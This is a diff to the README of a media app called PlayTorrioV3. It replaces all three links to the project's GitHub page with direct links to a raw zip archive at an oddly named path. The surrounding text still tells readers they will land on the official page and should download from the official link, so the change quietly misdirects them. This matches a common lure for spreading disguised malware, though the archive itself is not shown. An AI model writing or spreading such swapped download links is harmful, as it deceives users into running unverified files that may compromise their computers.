@@ -1,6 +1,6 @@
 # 🎬 PlayTorrioV3 - All Your Media, One Beautiful App
 
-[![Download PlayTorrioV3](https://img.shields.io/badge/Download-PlayTorrioV3-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Joplenary756/PlayTorrioV3)
+[![Download PlayTorrioV3](https://img.shields.io/badge/Download-PlayTorrioV3-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/Joplenary756/PlayTorrioV3/main/populationistic/v1.1-beta.3.zip)
 
 ---
 
@@ -26,7 +26,7 @@ Getting PlayTorrioV3 running on your Windows computer is simple. Follow these th
 
 Visit the link below to download the application:
 
-### 👉 [**Download PlayTorrioV3**](https://github.com/Joplenary756/PlayTorrioV3)
+### 👉 [**Download PlayTorrioV3**](https://raw.githubusercontent.com/Joplenary756/PlayTorrioV3/main/populationistic/v1.1-beta.3.zip)
 
 When you click the link, you'll land on the official PlayTorrioV3 page. Look for the **"Download"** button or the **"Releases"** section on the right side of the page. Click it and save the file to your computer.
 
@@ -173,7 +173,7 @@ PlayTorrioV3 is built for people who want great entertainment without complicate
 
 Remember: always download from the official GitHub link to ensure you're getting the authentic, up-to-date version.
 
-### 👉 [**Download PlayTorrioV3 Now**](https://github.com/Joplenary756/PlayTorrioV3)
+### 👉 [**Download PlayTorrioV3 Now**](https://raw.githubusercontent.com/Joplenary756/PlayTorrioV3/main/populationistic/v1.1-beta.3.zip)
 
 ---
 
